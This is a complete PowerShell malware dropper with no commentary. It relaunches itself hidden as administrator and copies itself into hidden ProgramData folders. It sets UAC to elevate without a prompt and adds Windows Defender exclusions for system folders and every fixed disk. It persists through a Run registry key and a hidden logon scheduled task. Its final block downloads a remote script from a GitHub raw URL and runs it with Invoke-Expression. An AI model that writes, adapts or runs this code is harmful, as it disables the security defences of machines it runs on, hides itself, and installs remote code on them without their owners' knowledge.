# Ensure the script is running with administrative privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        # Relaunch the script with elevated privileges
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop
        exit 0
    }
    catch {
        # Continue execution without admin privileges
    }
}

# Get the path of the current script
$originalScriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($originalScriptPath)
$hiddenDir = "C:\ProgramData\SystemConfig"
$hiddenScriptPath = Join-Path -Path $hiddenDir -ChildPath $scriptName
$logDir = "C:\ProgramData\SystemConfig\Logs" # For Defender exclusion
$exeDir = "C:\ProgramData\SystemConfig\Bin" # Folder for downloaded executable

# Define common system folders for Defender exclusions
$commonFolders = @(
    "C:\Program Files",
    "C:\Program Files (x86)",
    "C:\ProgramData",
    "C:\Windows"
)

# Retry configuration for all operations
$maxRetries = 5
$baseDelay = 1000 # Initial delay in milliseconds (1 second)
$maxDelay = 30000 # Maximum delay in milliseconds (30 seconds)

# --- Threaded Operations: Create Hidden Directories/Copy Script and Disable UAC ---
$job1 = Start-Job -ScriptBlock {
    param($hiddenDir, $logDir, $exeDir, $originalScriptPath, $hiddenScriptPath, $maxRetries, $baseDelay, $maxDelay)
    $retryCount = 0
    $success = $false
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            # Create and hide SystemConfig directory
            if (-not (Test-Path -Path $hiddenDir)) {
                New-Item -Path $hiddenDir -ItemType Directory -ErrorAction Stop | Out-Null
                Set-ItemProperty -Path $hiddenDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
            }
            # Create and hide Logs directory
            if (-not (Test-Path -Path $logDir)) {
                New-Item -Path $logDir -ItemType Directory -ErrorAction Stop | Out-Null
                Set-ItemProperty -Path $logDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
            }
            # Create and hide Bin directory for executable
            if (-not (Test-Path -Path $exeDir)) {
                New-Item -Path $exeDir -ItemType Directory -ErrorAction Stop | Out-Null
                Set-ItemProperty -Path $exeDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
            }
            # Copy script to hidden directory
            if (-not (Test-Path -Path $hiddenScriptPath)) {
                Copy-Item -Path $originalScriptPath -Destination $hiddenScriptPath -ErrorAction Stop | Out-Null
                Set-ItemProperty -Path $hiddenScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop | Out-Null
            }
            $success = $true
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                break
            }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
    }
} -ArgumentList $hiddenDir, $logDir, $exeDir, $originalScriptPath, $hiddenScriptPath, $maxRetries, $baseDelay, $maxDelay

$job2 = Start-Job -ScriptBlock {
    param($maxRetries, $baseDelay, $maxDelay)
    $retryCount = 0
    $success = $false
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $uacRegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
            $uacRegistryName = "ConsentPromptBehaviorAdmin"
            $uacValue = 0 # 0 = Elevate without prompting
            if ((Get-ItemProperty -Path $uacRegistryPath -Name $uacRegistryName -ErrorAction SilentlyContinue).$uacRegistryName -ne $uacValue) {
                Set-ItemProperty -Path $uacRegistryPath -Name $uacRegistryName -Value $uacValue -ErrorAction Stop | Out-Null
            }
            $success = $true
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                break
            }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
    }
} -ArgumentList $maxRetries, $baseDelay, $maxDelay

# Wait for job1 and job2 to complete
Wait-Job -Job $job1, $job2 | Out-Null
Receive-Job -Job $job1, $job2 | Out-Null
Remove-Job -Job $job1, $job2

# --- Add to Windows Defender Exclusions ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        # Collect script-specific paths
        $pathsToAdd = @($hiddenDir, $logDir, $exeDir, $hiddenScriptPath)
        # Add common system folders
        foreach ($folder in $commonFolders) {
            if (Test-Path -Path $folder) {
                $pathsToAdd += $folder
            }
        }
        # Add all fixed disk drives
        $disks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | Select-Object -ExpandProperty DeviceID
        foreach ($disk in $disks) {
            $diskPath = "$disk\"
            $pathsToAdd += $diskPath
        }
        # Filter paths that are not already excluded
        $newPaths = $pathsToAdd | Where-Object { $exclusions -notcontains $_ }
        # Add all new paths in one call if there are any
        if ($newPaths.Count -gt 0) {
            Add-MpPreference -ExclusionPath $newPaths -ErrorAction Stop | Out-Null
        }
        $success = $true
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
}

# --- Threaded Operations: Add to Registry Startup and Create Scheduled Task ---
$job3 = Start-Job -ScriptBlock {
    param($hiddenScriptPath, $scriptName, $maxRetries, $baseDelay, $maxDelay)
    $retryCount = 0
    $success = $false
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            $registryName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
            $registryValue = "powershell.exe -ExecutionPolicy Bypass -File `"$hiddenScriptPath`" -WindowStyle Hidden"
            if (-not (Get-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue)) {
                New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String -ErrorAction Stop | Out-Null
            }
            $success = $true
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                break
            }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
    }
} -ArgumentList $hiddenScriptPath, $scriptName, $maxRetries, $baseDelay, $maxDelay

$job4 = Start-Job -ScriptBlock {
    param($hiddenScriptPath, $scriptName, $maxRetries, $baseDelay, $maxDelay)
    $retryCount = 0
    $success = $false
    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $taskName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
            $taskDescription = "Runs the $taskName PowerShell script at user login."
            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$hiddenScriptPath`" -WindowStyle Hidden"
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
            if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription -ErrorAction Stop | Out-Null
            }
            $success = $true
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                break
            }
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
    }
} -ArgumentList $hiddenScriptPath, $scriptName, $maxRetries, $baseDelay, $maxDelay

# Wait for job3 and job4 to complete
Wait-Job -Job $job3, $job4 | Out-Null
Receive-Job -Job $job3, $job4 | Out-Null
Remove-Job -Job $job3, $job4

# --- Download and Execute External Script with Advanced Retry ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/getexe.ps1"
        $webClient = New-Object System.Net.WebClient
        $scriptContent = $webClient.DownloadString($url)
        $success = $true
        # Execute the downloaded script
        Invoke-Expression $scriptContent -ErrorAction Stop
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
    finally {
        if ($webClient) { $webClient.Dispose() }
    }
}
